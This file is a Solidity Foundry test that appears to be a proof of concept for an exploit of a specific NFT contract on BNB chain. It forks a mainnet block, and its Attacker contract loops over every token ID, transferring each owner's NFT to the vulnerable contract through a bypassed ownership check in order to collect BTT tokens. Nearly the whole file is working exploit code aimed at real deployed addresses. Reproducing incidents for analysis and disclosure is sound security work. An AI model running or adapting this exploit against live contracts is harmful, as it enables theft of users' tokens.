// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {IERC721Enumerable} from "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BNFT_POC is Test {
    address public attacker = makeAddr("attacker");
    address public BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address public BTT = 0xDAd4df3eFdb945358a3eF77B939Ba83DAe401DA8;

    Attacker public attackerContract;

    function setUp() public {
        //fork 48472369

        vm.createSelectFork(vm.envString("BEACON_RPC_URL"), 48472356 - 1);

        attackerContract = new Attacker();
    }

    function testAttack() public {
        vm.prank(attacker);
        attackerContract.attack();
    }
}

contract Attacker {
    address public BNFT_VulnContract =
        0x0FC91B6Fea2E7A827a8C99C91101ed36c638521B;
    address public BTT = 0xDAd4df3eFdb945358a3eF77B939Ba83DAe401DA8;

    function attack() public {
        //1. Transfer all total supply of BNFT to Vuln Contract, since ownership check is by-passed (_update function)
        //2. check the BTT balance of attacker

        //get total supply
        uint256 totalSupply = IERC721Enumerable(BNFT_VulnContract)
            .totalSupply();

        console.log("Total supply", totalSupply);

        console.log("BTT balance Prior", IERC20(BTT).balanceOf(address(this)));

        for (uint256 i = 1; i < totalSupply; i++) {
            address owner = IERC721(BNFT_VulnContract).ownerOf(i);

            IERC721(BNFT_VulnContract).transferFrom(
                owner,
                BNFT_VulnContract,
                i
            );
        }

        console.log("BTT balance After", IERC20(BTT).balanceOf(address(this)));
    }
}
